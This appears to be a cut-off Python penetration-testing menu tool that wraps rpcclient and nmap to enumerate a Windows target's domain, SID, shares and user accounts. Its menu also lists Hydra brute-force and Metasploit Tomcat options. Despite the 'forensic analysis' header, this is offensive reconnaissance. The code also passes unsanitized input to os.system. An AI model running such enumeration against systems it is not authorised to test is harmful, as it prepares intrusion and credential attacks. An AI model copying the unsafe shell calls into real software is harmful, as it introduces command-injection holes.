#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#       PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF REMOTE WINDOWS SYSTEMS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY                                                                
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import os.path
import hashlib
import binascii
import datetime
import requests
import linecache

from termcolor import colored	# PIP INSTALL TERMCOLOR
colour1 = 'yellow'
colour2 = 'green'
colour3 = 'white'

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : JERRY                                                                
# Details : Conduct simple and routine tests on user supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print("\n[*] Please run this python3 script as root...")
    exit(True)

BUG = 0				# BUGHUNT ON/OFF

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : JERRY
# Details : Create functional calls from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def padding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dpadding(variable,value):
   test = variable
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      if test == "":
         variable += " "
      else:
         variable += "."
   return variable

def rpadding(variable,value):
   while len(variable) < value:
      temp = variable
      variable = "." + temp
   return variable

def gettime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = padding(variable, value)
   return variable

def command(command):
   if BUG == 1:
      print(colored(command, colour3))
   os.system(command)
   return
 
def prompt():
   selection = input("\nPress ENTER to continue...")
   return   
   
def cleanshares():
   for x in range(0, MAXX):
      SHAR[x] = " "*COL2
   return
   
def cleanusers():
   for x in range (0, MAXX):
      USER[x] = " "*COL3
      PASS[x] = " "*COL4
   return

def display():
   print('\u2554' + ('\u2550')*57 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + (" ")*30 + colored("REMOTE SYSTEM",colour3) +  (" ")*14 + '\u2551' + (" ")*1 + colored("SHARENAME",colour3) + (" ")*7 + colored("TYPE",colour3) + (" ")*6 + colored("COMMENT",colour3) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour3) + (" ")*16 + colored("NTFS PASSWORD HASH",colour3) + (" ")*15 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')

# -------------------------------------------------------------------------------------
 
   print('\u2551' + " DNSERVER IP  " + '\u2502', end=' ')
   if DNS[:5] == "EMPTY":
      print(colored(DNS[:COL1],colour1), end=' ')
   else:
      print(colored(DNS[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[0],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[0],colour2), end=' ')
   print(colored(PASS[0],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
   if TIP[:5] == "EMPTY":
      print(colored(TIP[:COL1],colour1), end=' ')
   else:
      print(colored(TIP[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[1],colour2), end=' ')
   print(colored(PASS[1],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " LIVE PORTS   " + '\u2502', end=' ')
   if POR[:5] == "EMPTY":
      print(colored(POR[:COL1],colour1), end=' ')
   else:
      print(colored(POR[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[2],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[2],colour2), end=' ')
   print(colored(PASS[2],colour2), end=' ')
   print('\u2551') 
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " WEB ADDRESS  " + '\u2502', end=' ')
   if WEB[:5] == "EMPTY":
      print(colored(WEB[:COL1],colour1), end=' ')
   else:
      print(colored(WEB[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[3],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[3],colour2), end=' ')
   print(colored(PASS[3],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " USERNAME     " + '\u2502', end=' ')
   if USR[:2] == "''":
      print(colored(USR[:COL1],colour1), end=' ')
   else:
      print(colored(USR[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[4],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[4],colour2), end=' ')
   print(colored(PASS[4],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
   if PAS[:2] == "''":
      print(colored(PAS[:COL1],colour1), end=' ')
   else:
      print(colored(PAS[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[5],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[5],colour2), end=' ')
   print(colored(PASS[5],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
   if NTM[:5] == "EMPTY":
      print(colored(NTM[:COL1],colour1), end=' ')
   else:
      print(colored(NTM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[6],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[6],colour2), end=' ')
   print(colored(PASS[6],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " DNS NAME     " + '\u2502', end=' ')
   if DOM[:5] == "EMPTY":
      print(colored(DOM[:COL1],colour1), end=' ')
   else:
      print(colored(DOM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[7],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[7],colour2), end=' ')
   print(colored(PASS[7],colour2), end=' ')
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " EMPTY        " + '\u2502', end=' ')
   if SID[:5] == "EMPTY":
      print(colored(SID[:COL1],colour1), end=' ')
   else:
      print(colored(SID[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[8],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[8],colour2), end=' ')
   print(colored(PASS[8],colour2), end=' ')
   print('\u2551')     
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " EMPTY        " + '\u2502', end=' ')
   if TSH[:5] == "EMPTY":
      print(colored(TSH[:COL1],colour1), end=' ')
   else:
      print(colored(TSH[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[9],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[9],colour2), end=' ')
   print(colored(PASS[9],colour2), end=' ')
   print('\u2551')        
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
   if SKEW == 0:
      print(colored(LTM[:COL1],colour1), end=' ')
   else:
      print(colored(LTM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[10],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(USER[10],colour2), end=' ')
   print(colored(PASS[10],colour2), end=' ')
   print('\u2551')   
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
   if DIR[:8] == "WORKAREA":
      print(colored(DIR[:COL1],colour1), end=' ')
   else:
      print(colored(DIR[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   
   if SHAR[12][:1] != " ":
      print(colored(SHAR[11],'red'), end=' ')
   else:
      print(colored(SHAR[11],colour2), end=' ')
   print('\u2551', end=' ')
   if USER[12][:1] != " ":
      print(colored(USER[11],'red'), end=' ')
   else:
      print(colored(USER[11],colour2), end=' ')
   print(colored(PASS[11],colour2), end=' ')
   print('\u2551')  
   print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')

def options():
   print('\u2551' + "(0) Re/Set EMPTY      (10) Re/Set EMPTY      (20) NSLookup   (30)               (40)              (50)             (60) GenSSHKey ID (70) MSFTomCat (80) SSH ID 22 " + '\u2551')
   print('\u2551' + "(1) Re/Set DNSERVER   (11) Re/Set SERVERTIME (21) DNSRecon   (31)               (41)              (51)             (61) GenList USER (71)           (81) Telnet 23 " + '\u2551')
   print('\u2551' + "(2) Re/Set REMOTE IP  (12) Re/Set DIRECTORY  (22) Dig        (32)               (42)              (52)             (62) GenList PASS (72)           (82) NetCat 80 " + '\u2551')
   print('\u2551' + "(3) Re/Set LIVE PORTS (13) Ping DNSERVER IP  (23) AdiDNSDump (33)               (43)              (53)             (63) Editor USER  (73)           (83) SQSH  1433" + '\u2551')
   print('\u2551' + "(4) Re/Set WEBADDRESS (14) Ping REMOTE IP    (24)            (34)               (44)              (54)             (64) Editor PASS  (74)           (84) MSSQL 1433" + '\u2551')
   print('\u2551' + "(5) Re/Set USERNAME   (15) TraceRoute REM IP (25)            (35)               (45)              (55)             (65) Editor HOST  (75)           (85) MySQL 3306" + '\u2551')
   print('\u2551' + "(6) Re/Set PASSWORD   (16) Nmap LIVE PORTS   (26)            (36)               (46)              (56)             (66) Editor DNS   (76) Nikto     (86) RDesk 3389" + '\u2551')
   print('\u2551' + "(7) Re/Set NTLM HASH  (17) Nmap PortService  (27)            (37)               (47)              (57)             (67) HYDRA SSH    (77) GoBuster  (87) XRDP  3389" + '\u2551')
   print('\u2551' + "(8) Re/Set DNS NAME   (18) Nmap SubDOMAINS   (28)            (38)               (48)              (58)             (68) HYDRA SMB    (78) FTP 21    (88) WinRM 5985" + '\u2551')
   print('\u2551' + "(9) Re/Set EMPTY      (19) Nmap Server Time  (29)            (39)               (49)              (59)             (69) HYDRA TomCat (79) SSH 22    (89) Save/Exit " + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY                                                                
# Details : Display my universal header.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("clear")
print(" __  __    _    ____ _____ _____ ____      ") 
print("|  \/  |  / \  / ___|_   _| ____|  _ \     ") 
print("| |\/| | / _ \ \___ \ | | |  _| | |_) |    ") 
print("| |  | |/ ___ \ ___) || | | |___|  _ <     ") 
print("|_|  |_/_/   \_\____/ |_| |_____|_| \_\    ")
print("                                                                  ")
print("BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS). 	     \n")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : JERRY
# Details : Boot the system and initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print("[*] Booting - Please wait...\n")
if not os.path.exists("WORKAREA"):			
   os.mkdir("WORKAREA")
   print("[+] Work area created...")
else:
   print("[+] Work area already exists...")		# DEFAULT WORK DIRECTORY

if not os.path.exists("usernames.txt"):			
   command("touch usernames.txt")
   print("[+] File usernames.txt created...")
else:
   print("[+] File usernames.txt already exists...")	# USER LIST
   
if not os.path.exists("passwords.txt"):			
   command("touch passwords.txt")
   print("[+] File passwords.txt created...")
else:
   print("[+] File passwords.txt already exists...")	# PASSWORD LIST

print("[+] Populating system variables...")

PATH = "/usr/share/doc/python3-impacket/examples/" 	# IMPACKET LOCATION

SKEW = 0         	# TIME SKEW
DOMC = 0		# DOMAIN COUNTER
DNSC = 0		# DNS COUNTER
COL1 = 40	 	# SESSIONS
COL2 = 44	 	# SHARE NAMES
COL3 = 23	 	# USER NAMES
COL4 = 32	 	# PASSWORDS
MAXX = 1000		# 0 - 999			# NOT LIMITED

SHAR = [" "*COL2]*MAXX	# SHARE NAMES
USER = [" "*COL3]*MAXX	# USER NAMES
PASS = [" "*COL4]*MAXX	# PASSWORDS

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : JERRY
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists('config.txt'):
   print("[+] Configuration file not found - using defualt values...")
   DNS = "EMPTY              " # DNS NAME
   TIP = "EMPTY              " # REMOTE IP
   POR = "EMPTY              " # LIVE PORTS
   WEB = "EMPTY              " # WEB ADDRESS
   USR = "''                 " # SESSION USERNAME
   PAS = "''                 " # SESSION PASSWORD       
   NTM = "EMPTY              " # NTLM HASH
   DOM = "EMPTY              " # DOMAIN NAME
   SID = "EMPTY              " # DOMAIN SID
   TSH = "EMPTY              " # SESSION SHARE
   LTM = "00:00              " # LOCAL TIME    
   DIR = "WORKAREA           " # DIRECTORY
else:
   print("[+] Configuration file found - restoring saved data....")
   DNS = linecache.getline('config.txt', 1).rstrip("\n")
   TIP = linecache.getline('config.txt', 2).rstrip("\n")
   POR = linecache.getline('config.txt', 3).rstrip("\n")
   WEB = linecache.getline('config.txt', 4).rstrip("\n")
   USR = linecache.getline('config.txt', 5).rstrip("\n")
   PAS = linecache.getline('config.txt', 6).rstrip("\n")
   NTM = linecache.getline('config.txt', 7).rstrip("\n")
   DOM = linecache.getline('config.txt', 8).rstrip("\n")	
   SID = linecache.getline('config.txt', 9).rstrip("\n")
   TSH = linecache.getline('config.txt', 10).rstrip("\n")
   LTM = linecache.getline('config.txt', 11).rstrip("\n")
   DIR = linecache.getline('config.txt', 12).rstrip("\n")

if len(DNS) < COL1: DNS = padding(DNS, COL1)
if len(TIP) < COL1: TIP = padding(TIP, COL1)
if len(POR) < COL1: POR = padding(POR, COL1)
if len(WEB) < COL1: WEB = padding(WEB, COL1)
if len(USR) < COL1: USR = padding(USR, COL1)
if len(PAS) < COL1: PAS = padding(PAS, COL1)
if len(NTM) < COL1: NTM = padding(NTM, COL1)
if len(DOM) < COL1: DOM = padding(DOM, COL1)
if len(SID) < COL1: SID = padding(SID, COL1)
if len(TSH) < COL1: TSH = padding(TSH, COL1)
if len(LTM) < COL1: LTM = padding(LTM, COL1)
if len(DIR) < COL1: DIR = padding(DIR, COL1)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : JERRY
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   command("clear")
   linecache.clearcache()
   LTM = gettime(COL1)
   display()
   options()
   selection=input("[*] Please Select: ")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      CheckParams = 0

      if (TIP[:5] == "EMPTY"):
         print("\n[-] Remote IP address not specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Attempting to enumerate domain name...")
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")

         if os.path.getsize("lsaquery.tmp") == 0:
            print("[-] Unable to enumerate RPC data...")
         else:
            line1 = linecache.getline("lsaquery.tmp", 1)
            if (line1[:6] == "Cannot") or (line1[:1] == ""):
               print("[-] Unable to connect to RPC data...")
            else:
               DOM = " "*COL1					# WIPE CLEAN CURRENT VALUES
               SID = " "*COL1
               try:
                  null,DOM = line1.split(":")
               except ValueError:
                  DOM = "Error..."
                  
               DOM = DOM.strip(" ")				# CLEAN UP DATA
               if len(DOM) < COL1: DOM = padding(DOM, COL1)
                  
               if DOM[:5] == "Error":
                  print("[-] Unable to enumerate domain name...")
               else:
                  print("[+] Found domain...\n")
                  print(colored(DOM,colour2, attrs=['bold']))
            
                  if DOMC == 1:
                     print("\n[*] Resetting current domain association...")
                     command("sed -i '$d' /etc/hosts")
                     command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
                     print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
                  else:
                     command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
                     print("\n[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
                     DOMC = 1
                     
# ------------------------------------------------------------------------------------- 

            print("[*] Attempting to enumerate domain SID...")
            line2 = linecache.getline("lsaquery.tmp", 2)
            
            if (line2[:6] == "Cannot") or (line2[:1] == ""):            
               print("[-] Unable to connect to RPC data...")
            else:
               try:
                  null,SID = line2.split(":")
               except ValueError:
                  SID = "Error..."
               
               SID = SID.strip(" ")				# CLEAN UP DATA
               SID = padding(SID, COL1)
               
               if SID[:5] == "Error":
                  print("[-] Unable to enumerate domain SID...")
               else:
                  print("[+] Found SID...\n")
                  print(colored(SID,colour2, attrs=['bold']) + "\n")
                  
# ------------------------------------------------------------------------------------- 
          
         print("[*] Attempting to enumerate shares...")
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.tmp")

         line3 = linecache.getline("shares1.tmp", 1)
         if (line3[:9] == "Could not") or (line3[:6] == "Cannot") or (line3[:1] == ""):
            print("[-] Unable to enumerate shares...")
         else:
            cleanshares()						# WIPE CURRENT SHARE VALUES

            command("sed -i -n '/netname: /p' shares1.tmp")		# TIDY UP FILE FOR READING
            command("sed -i '/^$/d' shares1.tmp")
            command("cat shares1.tmp | sort > shares2.tmp")
                        
            count = len(open('shares2.tmp').readlines())
            if count != 0:
               print("[+] Found shares...\n")
               for x in range(0, count):
                  SHAR[x] = linecache.getline("shares2.tmp", x + 1)
                  SHAR[x] = SHAR[x].replace(" ","")
                  try:
                     null, SHAR[x] = SHAR[x].split(":")
                  except ValueError:
                     SHAR[x] = "Error..."
                  print(colored(SHAR[x].rstrip("\n"),colour2, attrs=['bold']))
                  if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)
               print("")
                  
# ------------------------------------------------------------------------------------- 
     
         print("[*] Attempting to enumerate domain users...")          
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.tmp")      

         line4 = linecache.getline("domusers1.tmp", 1)
         if (line4[:9] == "Could not") or (line4[:6] == "result") or (line4[:6] == "Cannot") or (line4[:1] == ""):
            print("[-] Unable to enumerate domain users..")
         else:
            cleanusers()							# WIPE CLEAN USERS AND PASSWORDS             
            os.remove("usernames.txt")						# PURGE CURRENT USERFILE LIST            
            command("touch usernames.txt")					# CREATE NEW USERFILE LIST   
                     
            command("cat domusers1.tmp | sort > domusers2.tmp")			# TIDY NEW USER FILE FOR READING
            command("sed -i '/^$/d' domusers2.tmp")
            
            count2 = len(open('domusers2.tmp').readlines()) 
            if count2 != 0:
               print ("[+] Found users...\n")
               for x in range(0, count2):
                  line5 = linecache.getline("domusers2.tmp", x + 1)
                  try:
                     null,USER[x],null2 = line5.split(":");
                  except ValueError:
                     USER[x] = "Error..."
                  USER[x] = USER[x].replace("[","")
                  USER[x] = USER[x].replace("]","")
                  USER[x] = USER[x].replace("rid","")
                  if USER[x][:5] != "Error":
                     print(colored(USER[x],colour2, attrs=['bold']))
                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                  command("echo " + USER[x] + " >> usernames.txt")
      
      command("rm *.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNS
      DNS = input("[*] Please enter DNSERVER IP address: ")

      if DNS == "":
         DNS = BAK
      else:
         if len(DNS) < COL1:
            DNS = padding(DNS, COL1)
         if DNSC == 1:
            print("\n[+] Resetting current DNSERVER IP association...")
            command("sed -i '$d' /etc/resolv.conf")
            DNS = "EMPTY"
            DNS = padding(DOM, COL1)
            DNSC = 0
         if DNS[:5] != "EMPTY":
            command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
            print("[+] DNSERVER IP " + DNS.rstrip(" ") + " has been added to /etc/resolv.conf...")
            DNSC = 1
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("[*] Please enter REMOTE IP address: ")

      if TIP == "":
         TIP = BAK
      else:
         if len(TIP) < COL1:
            TIP = padding(TIP, COL1)
         if DOMC == 1:
            print("\n[+] Resetting current domain association...")
            command("sed -i '$d' /etc/hosts")
            DOM = "EMPTY"
            DOM = padding(DOM, COL1)
            DOMC = 0
         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      print("[+] Live ports: " + POR.rstrip(" "))
      BAK = POR
      POR = input("[*] Please enter PORT numbers: ")

      if POR != "":
         if len(POR) < COL1:
            POR = padding(POR, COL1)
         else:
            POR = POR.rstrip("\n")
      else:
         POR = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the web address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = WEB
      WEB = input("[*] Please enter the web address: ")

      if WEB != "":
         if len(WEB) < COL1:
            WEB = padding(WEB, COL1)
      else:
         WEB = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = USR
      USR = input("[*] Please enter USERNAME: ")

      if USR == "":
         USR = BAK
      else:
         if len(USR) < COL1: USR = padding(USR, COL1)
         for x in range(0, MAXX):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               NTM = PASS[x] # UPDATE HASH VALUE TO MATCH USER.
               NTM = padding(NTM, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = PAS
      PAS = input("[*] Please enter PASSWORD: ")

      if PAS != "":
         if len(PAS) < COL1:
            PAS = padding(PAS, COL1)
      else:
         PAS = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = NTM
      NTM = input("[*] Please enter HASH value: ")

      if NTM != "":
         if len(NTM) < COL1:
            NTM = padding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = DOM
      DOM = input("[*] Please enter DNServer name: ")

      if DOM != "":
         if len(DOM) < COL1:
            DOM = padding(DOM, COL1)
         if DOMC == 1:
            print("[+] Removing previous DNServer name from /etc/hosts...")
            command("sed -i '$d' /etc/hosts")
         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] DNServer " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         prompt()
      else:
         DOM = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = SID
      SID = input("[*] Please enter DOMAIN SID value: ")

      if SID != "":
         if len(SID) < COL1:
            SID = padding(SID, COL1)
      else:
         SID = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = TSH
      TSH = input("[*] Please enter SHARE name: ")

      if TSH != "":
         if len(TSH) < COL1:
            TSH = padding(TSH,COL1)
      else:
         TSH = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = LTM
      LTM = input("[*] Please enter computer TIME: ")

      if LTM != "":
         command("date --set=" + LTM)
         LTM = padding(LTM, COL1)
         SKEW = 1
      else:
         LTM = BAK      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      directory = input("[*] Please enter new working DIRECTORY: ")

      if os.path.exists(directory):
         print("[-] Directory already exists....")
      else:
         if len(directory) > 0:
            os.mkdir(directory)
            DIR = directory
            if len(DIR) < COL1:
               DIR = padding(DIR, COL1)
            print("[+] Working directory changed...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - PING DNS IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      command("ping -c 1 -a -R " + DNS.rstrip(" "))
      if DOM[:5] != "EMPTY":
         command("ping -c 1 -a -R " + DOM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - PING REMOTE IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      command("ping -c 1 -a -R " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - TRACEROUTE REMOTE IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      command("traceroute " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
      else:
         print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
         command("ports=$(nmap -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
         POR = linecache.getline("PORTS.tmp", 1)         
         
         if len(POR) < COL1:
            POR = padding(POR, COL1)
         else:
            POR = POR.rstrip("\n")           

         if POR[:1] == "":
            print("[-] Unable to enumerate any port information, good luck!!...")
         else:
            print("[+] Found live ports...\n")
            print(colored(POR,colour2, attrs=['bold']))         
        
         prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
      else:
         if POR[:5] != "EMPTY":
            print("[*] Scanning specified live ports only, please wait...")
            command("nmap -p " + POR.rstrip(" ") + " -sC -sV " + TIP.rstrip(" "))
         else:
            print("[*] Fast scanning all ports, please wait...")
            command("nmap -T4 -F " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
